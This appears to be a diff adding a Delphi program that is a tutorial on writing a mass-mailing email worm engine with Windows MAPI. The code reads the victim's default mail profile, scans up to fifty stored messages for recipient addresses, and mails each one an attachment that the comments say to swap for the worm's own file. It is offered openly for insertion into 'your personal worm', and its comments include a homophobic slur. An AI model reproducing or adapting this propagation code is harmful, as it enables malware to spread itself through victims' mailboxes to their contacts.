@@ -1,0 +1,194 @@
+program mapiworm;
+
+uses
+  Windows, MAPI;
+
+{$R *.RES}
+
+(**************   MAPI Worms in C++ and Delphi   *********************
+
+  I haven't seen much documentation on writing a worm via Win32 HLL's
+  so here goes.  Nothing revolutionary, just simple API calls.
+  This article is mainly aimed at the beginner, since actually researching
+  this shit by hand is a major pain in the ass and time-consuming.
+
+  I'm showing the code in Delphi cause it's a bit easier to read
+  and looks nicer than C++.  Code can easily be converted to C in
+  about thirty minutes, see Microsoft's MSDN section for a complete
+  MAPI C++ example for the syntax.  A ton of code can be snipped before
+  inserting into your personal worm.  I figure showing it in "long form"
+  to be nice etiquette for an article-specific program.
+
+  This code was tested on NT 4.0, but might need a revision dependent
+  upon your OS and how MAPI is setup.  And before you laugh at 20k for
+  just the worm engine, I checked AVP's site for MAPI and found some
+  very large filesize worms doing moderately well in the wild:
+
+  I-Worm.PrettyPark: http://www.avp.ch/avpve/NewExe/win32/ppark.stm
+  I-Worm.ZippedFiles: http://www.avp.ch/avpve/worms/zipped.stm
+  I-Worm.WinExt: http://www.avp.ch/avpve/worms/WINEXT.stm
+  I-Worm.Plage: http://www.avp.ch/avpve/worms/Plage.stm
+
+  Couple of useful links:
+
+    Info on MAPI hook provider
+    http://support.microsoft.com/support/kb/articles/Q224/3/62.ASP
+
+    MAPI Address example
+    http://support.microsoft.com/support/kb/articles/Q126/6/58.asp
+
+    ReadMail example
+    http://support.microsoft.com/support/kb/articles/Q140/3/37.asp
+
+*)
+
+// Usage: HKEY_CURRENT_USER, 'Software\ImaFaggot', 'GayLesbian'
+function regReadString(kRoot: HKEY; sKey, sValue: String): String;
+var
+  qValue: array[0..1023] of Char;
+  DataSize: Integer;
+  CurrentKey: HKEY;
+begin
+  RegOpenKeyEx(kRoot, PChar(sKey), 0, KEY_ALL_ACCESS, CurrentKey);
+  Datasize := 1023;
+//  RegQueryValueEx(CurrentKey, PChar(sValue), nil, nil, nil, @DataSize);
+  RegQueryValueEx(CurrentKey, PChar(sValue), nil, nil, @qValue[0], @DataSize);
+  RegCloseKey(CurrentKey);
+  Result := String(qValue);
+end;
+
+var
+	MAPIMessage: TMAPIMessage;
+  lppMapiMessage: PMapiMessage;
+  Recip, inRecip: TMapiRecipDesc;
+  msgFile: TMapiFileDesc;
+  MError: Cardinal;
+  MapiSession, iMinusOne, i: LongInt;
+  bWinNT, bFindFirst: Boolean;
+  ProfileName, sAddress, sProfile, sSentMail: String;
+  sSeedMessageID, sMessageID: array[0..512] of Char;
+ 	os: TOSVersionInfo;
+begin
+	// Which Operating System we on?
+	os.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);
+	GetVersionEx(os);
+	bWinNT := (os.dwPlatformId = VER_PLATFORM_WIN32_NT);
+  // Grab default profilename from registry
+	if (bWinNT) then
+    ProfileName := regReadString(HKEY_CURRENT_USER,
+      'Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles',
+      'DefaultProfile')
+	else
+    // Standard Windows
+    ProfileName := regReadString(HKEY_CURRENT_USER,
+      'Software\Microsoft\Windows Messaging Subsystem\Profiles', 'DefaultProfile');
+
+  // Fucking Delphi bug won't allow a -1 to be set
+  // within the structure, so we trick it
+  iMinusOne := -1;
+  // Will hold any previous recipients
+  sSentMail := '';
+
+  // Logon to MAPI.  If no workie, get outta here
+  try
+    MError := MapiLogOn(0, PChar(ProfileName), nil, MAPI_NEW_SESSION, 0, @MapiSession);
+    if (MError <> SUCCESS_SUCCESS) then
+      Exit;
+  except
+    ;
+  end;
+
+  // Fill in the file structure with our attachment
+  with msgFile do
+  begin
+    ulReserved := 0;
+    flFlags := 0;
+    nPosition := iMinusOne; // Let Outlook handle the file position
+    // Obviously, replace the INI with your worm's path/filename
+    lpszPathName := PChar('c:\windows\system.ini');
+    lpszFileName := nil;
+    lpFileType := nil;
+  end;
+
+  bFindFirst := True;
+
+  // Walk through first fifty messages
+  for i := 1 to 50 do
+  try
+    // Keep up with our MessageID
+    if (bFindFirst) then
+    begin
+      sSeedMessageID := '';
+      bFindFirst := False;
+    end
+    else
+      sSeedMessageID := sMessageID;
+
+    // Find a message
+    // MapiFindNext serves as both a "findfirst/findnext" function, dependent
+    // upon if MessageSeed has a value
+    MError := MapiFindNext(MapiSession, 0, nil, @sSeedMessageID, 0, 0, @sMessageID);
+    if (MError = SUCCESS_SUCCESS) then
+    begin
+      // Obtain the long pointer
+      lppMapiMessage := @MAPIMessage;
+      // Open for Reading, headers only (both faster, and avoids
+      // writing all the god damned attachments to temp directory)
+      MError := MAPIReadMail(MAPISession, 0, @sMessageID,
+        MAPI_ENVELOPE_ONLY, 0, lppMapiMessage);
+      if (MError = SUCCESS_SUCCESS) and (lppMapiMessage.lpRecips <> nil) then
+      begin
+
+        // Sets info about message recipient
+      	with Recip do
+        begin
+        	ulReserved := 0;
+          ulRecipClass := MAPI_TO;
+          sAddress := 'SMTP:' + lppMapiMessage.lpRecips.lpszAddress;
+          lpszAddress := Pchar(sAddress);
+          lpszName := lppMapiMessage.lpRecips.lpszName;
+      		ulEIDSize := 0;
+      		lpEntryID := nil;
+        end;
+
+        // Clear out to avoid any leftover setting
+        FillChar(MAPIMessage, SizeOf(MAPIMessage), 0);
+        // Fill the MapiMessage structure.
+        // Unnecessary to expand entire struct, but aesthetically pleasing
+        with MapiMessage do
+        begin
+          ulReserved := 0;
+          lpszSubject := PChar('Insert subject for message');
+          lpszNoteText := PChar('Message text goes here');
+          lpszMessageType := nil;
+          lpszDateReceived := nil;
+          lpszConversationID := nil;
+          flFlags := 0;
+          lpOriginator := nil;
+          nRecipCount := 1;
+          lpRecips := @Recip;
+          nFileCount := 1;
+          lpFiles := @msgFile;
+        end;
+
+        // Send the message
+        if (Pos(lppMapiMessage.lpRecips.lpszAddress, sSentMail) = 0) then
+        begin
+          MError := MapiSendMail(MapiSession, {handle}0, MapiMessage, 0, 0);
+          // Store this address, so no duplicate messages are sent
+          sSentMail := sSentMail + lppMapiMessage.lpRecips.lpszAddress;
+        end;
+
+      end;
+    end;
+  except
+    ; // Process your errors like a man
+  end;
+
+  try
+    MError := MapiLogOff(MapiSession, 0, 0, 0);
+  except
+    ;
+  end;
+
+end.
